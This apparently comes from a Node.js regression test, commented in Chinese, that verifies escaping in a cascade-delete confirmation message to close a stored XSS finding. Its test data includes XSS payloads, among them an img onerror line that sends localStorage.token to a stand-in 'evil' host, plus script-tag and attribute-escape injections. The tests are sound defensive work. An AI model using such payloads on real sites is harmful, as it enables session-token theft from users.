/**
 * 级联删除确认文案的验证（条目 F-02：存储型 XSS）。
 *
 *   frontend/node_modules/.bin/esbuild frontend/src/utils/deleteConfirmMessage.ts \
 *       --format=esm --outfile=tests/fix_verify/frontend/.build/deleteConfirmMessage.mjs
 *   node tests/fix_verify/frontend/test_delete_confirm_message.mjs tests/fix_verify/frontend/.build/deleteConfirmMessage.mjs
 */
import assert from "node:assert/strict";
import path from "node:path";
import { pathToFileURL } from "node:url";

const modulePath = process.argv[2];
if (!modulePath) {
  console.error("用法: node test_delete_confirm_message.mjs <构建后的 deleteConfirmMessage.mjs 路径>");
  process.exit(2);
}
const { buildDeleteConfirmMessage, escapeHtml } = await import(
  pathToFileURL(path.resolve(modulePath)).href
);

let pass = 0;
let fail = 0;
const cases = [];

function check(name, fn) {
  try {
    fn();
    cases.push(`  [PASS] ${name}`);
    pass += 1;
  } catch (e) {
    cases.push(`  [FAIL] ${name}: ${e.message.split("\n")[0]}`);
    fail += 1;
  }
}

const XSS = `<img src=x onerror="fetch('//evil/'+localStorage.token)">`;

// ---------- 缺陷场景：数据名称必须被转义 ----------
check("名称中的 HTML 必须被转义（改前原样插入 → 删除时执行脚本）", () => {
  const msg = buildDeleteConfirmMessage(XSS, [{ label: "关联零件配比", count: 3 }]);
  assert.ok(!msg.includes("<img"), "不得出现可执行的 img 标签");
  assert.ok(msg.includes("&lt;img"), "应出现转义后的文本");
  assert.ok(!msg.includes("onerror=\""), "事件属性不得原样出现");
});

check("影响项 label 中的 HTML 必须被转义", () => {
  const msg = buildDeleteConfirmMessage("正常原料", [
    { label: `<script>alert(1)</script>`, count: 2 },
  ]);
  assert.ok(!msg.includes("<script>"), "label 不得注入 script 标签");
  assert.ok(msg.includes("&lt;script&gt;"));
});

check("属性型注入（引号）同样被转义", () => {
  const msg = buildDeleteConfirmMessage(`a" onmouseover="alert(1)`, [{ label: "x", count: 1 }]);
  assert.ok(!msg.includes('" onmouseover="'), "引号必须被转义，避免属性逃逸");
  assert.ok(msg.includes("&quot;"));
});

check("escapeHtml 覆盖 & < > \" ' 五个字符", () => {
  assert.equal(escapeHtml(`&<>"'`), "&amp;&lt;&gt;&quot;&#39;");
  assert.equal(escapeHtml(null), "");
  assert.equal(escapeHtml(undefined), "");
  assert.equal(escapeHtml(123), "123");
});

// ---------- 功能不变：正常文案与排版 ----------
check("正常中文名称：文案结构与改前一致（保留 <b>/<br/> 排版）", () => {
  const msg = buildDeleteConfirmMessage("铁矿石", [{ label: "关联零件配比", count: 3 }]);
  assert.ok(msg.includes("删除「<b>铁矿石</b>」"));
  assert.ok(msg.includes("将<b>级联删除</b>"));
  assert.ok(msg.includes("• 关联零件配比：3 条"));
  assert.ok(msg.includes("<br/><br/>确定继续删除吗？"));
});

check("计数为 0 的项被过滤，多项按顺序拼接", () => {
  const msg = buildDeleteConfirmMessage("原料", [
    { label: "A", count: 1 },
    { label: "B", count: 0 },
    { label: "C", count: 5 },
  ]);
  assert.ok(msg.includes("• A：1 条"));
  assert.ok(!msg.includes("• B："));
  assert.ok(msg.includes("• C：5 条"));
  assert.ok(msg.indexOf("• A") < msg.indexOf("• C"));
});

check("children 为空/未传：只保留标题与结尾", () => {
  const msg = buildDeleteConfirmMessage("原料", []);
  assert.ok(msg.includes("删除「<b>原料</b>」"));
  assert.ok(msg.includes("确定继续删除吗？"));
  assert.ok(!msg.includes("•"));
  assert.ok(buildDeleteConfirmMessage("原料").includes("删除「<b>原料</b>」"));
});

check("名称中的 & 先被转义（避免二次解析）", () => {
  const msg = buildDeleteConfirmMessage("A&B", [{ label: "x", count: 1 }]);
  assert.ok(msg.includes("A&amp;B"));
  assert.ok(!msg.includes("A&B"));
});

console.log(cases.join("\n"));
console.log(`\n结果：PASS=${pass} FAIL=${fail}`);
process.exitCode = fail === 0 ? 0 : 1;
